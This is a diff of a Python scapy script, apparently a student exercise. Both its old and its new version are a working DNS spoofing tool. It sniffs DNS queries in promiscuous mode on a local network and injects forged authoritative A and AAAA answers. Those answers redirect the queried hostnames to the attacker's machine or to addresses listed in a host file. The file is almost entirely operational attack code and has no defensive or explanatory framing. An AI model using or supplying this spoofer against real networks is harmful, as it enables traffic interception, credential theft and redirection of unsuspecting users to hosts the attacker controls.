@@ -1,82 +1,64 @@
-import getopt
-import sys
-import os
-import scapy.all as scapy
+from scapy.all import *
+from scapy.all import send as ssend
 import netifaces as ni
-global dns_ip
-dns_ip = dict()
+import logging
 
-def handle(packet):
-	global hostfile_dict
-	
-	# Only deal with packets containing DNS records
-	if packet.haslayer(scapy.DNS):
-		# Dissect packet into approriate layers
-		orig_ip = packet.getlayer(scapy.IP)
-		orig_udp = packet.getlayer(scapy.UDP)
-		orig_dns = packet.getlayer(scapy.DNS)
-		
-		# If -h option provided
-		if hostfile_dict:
-			# Check if queried domain part of hostfile
-			if (packet.getlayer(scapy.DNS).qd.qname) not in hostfile_dict.keys():
-				return
-			spoofed_rdata = hostfile_dict[orig_dns.qd.qname]
-		else:
-			# Spoofed IP of local machine
-			ni.ifaddresses(dev)
-			spoofed_rdata =  ni.ifaddresses(dev)[ni.AF_INET][0]['addr']
-		
-		#qr = 0 for Query and qtype = 1 for A record
-		if orig_dns.qr == 0 and orig_dns.qd.qtype == 1: 
-			spoofed_src_ip = orig_ip.dst
-			spoofed_dst_ip = orig_ip.src
-			spoofed_src_port = orig_udp.dport
-			spoofed_dst_port = orig_udp.sport
-			spoofed_id = orig_dns.id
-			spoofed_qr = 1 
-			spoofed_opcode = orig_dns.opcode
-			spoofed_aa = 1
-			spoofed_rd = orig_dns.rd
-			spoofed_ra = 0
-			spoofed_z = 0
-			spoofed_rcode = 0
-			spoofed_qdcount = 1
-			spoofed_ancount = 1
-			spoofed_question = scapy.DNSQR(qname = orig_dns.qd.qname, qtype = orig_dns.qd.qtype, qclass = orig_dns.qd.qclass)
-			spoofed_answer = scapy.DNSRR(rrname = orig_dns.qd.qname, type = orig_dns.qd.qtype, rclass = orig_dns.qd.qclass, ttl = 40960, rdata = spoofed_rdata)   
-			# To return multiple IPs
-			#/scapy.DNSRR(rrname = orig_dns.qd.qname, type = orig_dns.qd.qtype, rclass = orig_dns.qd.qclass, ttl = 40960, rdata = spoofed_rdata)
+conf.sniff_promisc=True
+addr='127.0.0.1'
+hostnames_specified = False
+interface = 'enpOs3'
+dns_holder = dict()
+def poison_cache(pkt):
+    global interface
+    global hostnames_specified
+    global addr
+    #if pkt.haslayer(DNS):
+        #if pkt.getlayer(DNS).qr == 0 and pkt.getlayer(DNS).qd.qtype == 1:
+    if IP in pkt:
+        if pkt.haslayer(DNSQR) and pkt.getlayer(DNS).qr == 0 and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[DNS].qd.qtype in {1, 28}:        
+            query = pkt[DNS].qd
+            pkt[UDP].chksum = None
+            print("queryname: "+ str(query.qname))
+            inmap = False
+            for e in dns_holder.keys():
+                if bytes(e.encode()) == query.qname:
+                    inmap = True
+                    newqname = e
 
-			spoofed_IP = scapy.IP(src = spoofed_src_ip, dst = spoofed_dst_ip)
-			spoofed_UDP = scapy.UDP(sport = spoofed_src_port, dport = spoofed_dst_port)
-			spoofed_DNS = scapy.DNS(id = spoofed_id, qr = 1, opcode = spoofed_opcode, aa = 1, rd = spoofed_rd, ra = 0, z = 0, rcode = 0, qdcount = spoofed_qdcount, ancount = spoofed_ancount, qd = spoofed_question, an = spoofed_answer)
-			# Sendp sends from layer 2
-			scapy.sendp(scapy.Ether()/spoofed_IP/spoofed_UDP/spoofed_DNS, iface = dev 	)
-
-
-def hf_lookup(hf):
-    f = open(hf, 'r')
-    for l in f:
-        domain = l.split(",")[1].strip()
-        ip = l.split(",")[0].strip()
-        dns_ip[domain] = ip
-
+            if hostnames_specified and inmap:
+                poison_addr = dns_holder[newqname]
+                print("Preparing spoofed packet")
+            else:
+                poison_addr = addr
+            inject_packet = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                DNS(id=pkt[DNS].id, qd=query, aa = 1, ancount = 1, qr=1, an=DNSRR(rrname=query.qname, ttl=330, rdata=poison_addr))
+            send(inject_packet, iface=interface)
+            print('Sent:', inject_packet.summary())
 
 def main():
-    print(sys.argv)
-    arg = sys.argv
-    ndi = (arg[arg.index("-i")+1].strip() if "-i" in arg else ni.gateways()['default'][ni.AF_INET][1])
-    hnf = (arg[arg.index("-h")+1].strip() if "-h" in arg else False)
-    if hnf: hf_lookup(hnf)
-    
-        
-    print(ndi)
-    print(hnf)
-    print(dns_ip)
-    #scapy.sniff(iface=str(ndi), filter=str(hnf), prn=realsniffer)
+    global interface
+    global addr
+    global hostnames_specified
+    interface = ni.gateways()['default'][ni.AF_INET][1]
+    addr = ni.ifaddresses(str(interface))[ni.AF_INET][0]['addr']
+    command = sys.argv
+    print(command)
+    if "-h" in command:
+        hostnamefile = command[command.index("-h")+1]
+        hostnames_specified = True
 
+    if "-i" in command:
+        interface = command[command.index("-i")+1]
 
-
+    if hostnames_specified:
+        hf = open(hostnamefile, "r")
+        for line in hf:
+            ip_host = line.split(',')
+            dns_holder[ip_host[1].strip() + "."] = str(ip_host[0]).strip()
+    print("Poison Map: " + str(dns_holder))
+    print("Sniffing on packets on interface: "+ str(interface))
+    sniff(iface = interface, prn = poison_cache, store = 0)
 if __name__ == "__main__":
     main()
+
